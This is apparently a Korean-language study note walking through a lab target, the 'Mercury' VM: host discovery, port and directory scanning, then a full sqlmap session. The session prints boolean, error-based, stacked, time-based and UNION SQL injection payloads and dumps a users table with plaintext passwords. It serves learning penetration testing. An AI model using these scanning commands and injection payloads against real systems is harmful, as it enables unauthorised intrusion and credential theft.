# \[자료 조사]
## IP 탐색
> `arp-scan -l`
![[Pasted image 20240930092029.png]]
![[Pasted image 20240930092144.png]]

> `fping -g 192.168.56.0/24 --ipv4 -s`
![[Pasted image 20240930092506.png]]
![[Pasted image 20240930092622.png]]

## 서비스 탐색
> `nmap 192.168.56.110 -sV -v -p- -sC`
![[Pasted image 20240930092835.png]]

> `dirb http://192.168.56.110:8080/`
![[Pasted image 20240930093942.png]]

> `nikto -h 192.168.56.110:8080 -C all`
![[Pasted image 20240930094208.png]]

gobuster
![[Pasted image 20240930094310.png]]![[Pasted image 20240930094521.png]]
- wordlist_files 를 활용
![[Pasted image 20240930094610.png]]![[Pasted image 20240930094659.png]]

# \[사이트 접속]
![[Pasted image 20240930094802.png]]

![[Pasted image 20240930100543.png]]
- 파이썬을 활용해 웹을 만들었구나

![[Pasted image 20240930100642.png]]

![[Pasted image 20240930100715.png]]
- 인젝션에 취약한 서버라고 한다.
![[Pasted image 20240930100925.png]]
- 잘못된 구문이라도 서버에서 반응하면 sql 인젝션에 취약할 가능성이 높다
- 수동 점검과 자동 점검이 있다.

## sql 자동 점검
![[Pasted image 20240930101249.png]]
- 일반 점검에서는 별 다른 정보를 얻지 못했다.
![[Pasted image 20240930101733.png]]
- 상세한 점검
```
┌──(jaeho㉿Attacker)-[~]
└─$ sudo sqlmap -u http://192.168.56.110:8080/mercuryfacts/1 -D mercury -T users --dump
[sudo] password for jaeho: 
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.5#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:18:06 /2024-09-29/

[21:18:06] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] y
[21:18:12] [INFO] testing connection to the target URL
got a 301 redirect to 'http://192.168.56.110:8080/mercuryfacts/1/'. Do you want to follow? [Y/n] y
[21:18:14] [INFO] checking if the target is protected by some kind of WAF/IPS
[21:18:14] [INFO] testing if the target URL content is stable
[21:18:14] [WARNING] URI parameter '#1*' does not appear to be dynamic
[21:18:15] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'MySQL')
[21:18:16] [INFO] testing for SQL injection on URI parameter '#1*'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[21:18:25] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:18:26] [WARNING] reflective value(s) found and filtering out
[21:18:27] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable 
[21:18:27] [INFO] testing 'Generic inline queries'
[21:18:27] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[21:18:27] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[21:18:28] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[21:18:28] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[21:18:28] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[21:18:28] [INFO] URI parameter '#1*' is 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' injectable 
[21:18:28] [INFO] testing 'MySQL inline queries'
[21:18:28] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[21:18:28] [WARNING] time-based comparison requires larger statistical model, please wait................ (done)  
[21:18:38] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable 
[21:18:38] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[21:18:48] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[21:18:48] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[21:18:48] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[21:18:48] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[21:18:49] [INFO] target URL appears to have 1 column in query
[21:18:49] [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
sqlmap identified the following injection point(s) with a total of 45 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://192.168.56.110:8080/mercuryfacts/1 AND 1707=1707

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: http://192.168.56.110:8080/mercuryfacts/1 AND GTID_SUBSET(CONCAT(0x7178707a71,(SELECT (ELT(1040=1040,1))),0x717a707a71),1040)

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: http://192.168.56.110:8080/mercuryfacts/1;SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: http://192.168.56.110:8080/mercuryfacts/1 AND (SELECT 3354 FROM (SELECT(SLEEP(5)))gHQm)

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: http://192.168.56.110:8080/mercuryfacts/1 UNION ALL SELECT CONCAT(0x7178707a71,0x417053716270486d4d6b464b6a4e414748507778494d79524e6768576d5a69766d58505250415273,0x717a707a71)-- -
---
[21:18:55] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.6
[21:18:55] [INFO] fetching columns for table 'users' in database 'mercury'
[21:18:55] [INFO] fetching entries for table 'users' in database 'mercury'
Database: mercury
Table: users
[4 entries]
+----+-------------------------------+-----------+
| id | password                      | username  |
+----+-------------------------------+-----------+
| 1  | johnny1987                    | john      |
| 2  | lovemykids111                 | laura     |
| 3  | lovemybeer111                 | sam       |
| 4  | mercuryisthesizeof0.056Earths | webmaster |
+----+-------------------------------+-----------+

[21:18:55] [INFO] table 'mercury.users' dumped to CSV file '/root/.local/share/sqlmap/output/192.168.56.110/dump/mercury/users.csv'                                                                                                   
[21:18:55] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/192.168.56.110'

[*] ending @ 21:18:55 /2024-09-29/
```


- db 사용자 계정을 찾았다.
![[Pasted image 20240930102048.png]]

![[Pasted image 20240930102341.png]]

# \[zap active scaning]
[[Zap]]
![[Pasted image 20240930100500.png]]
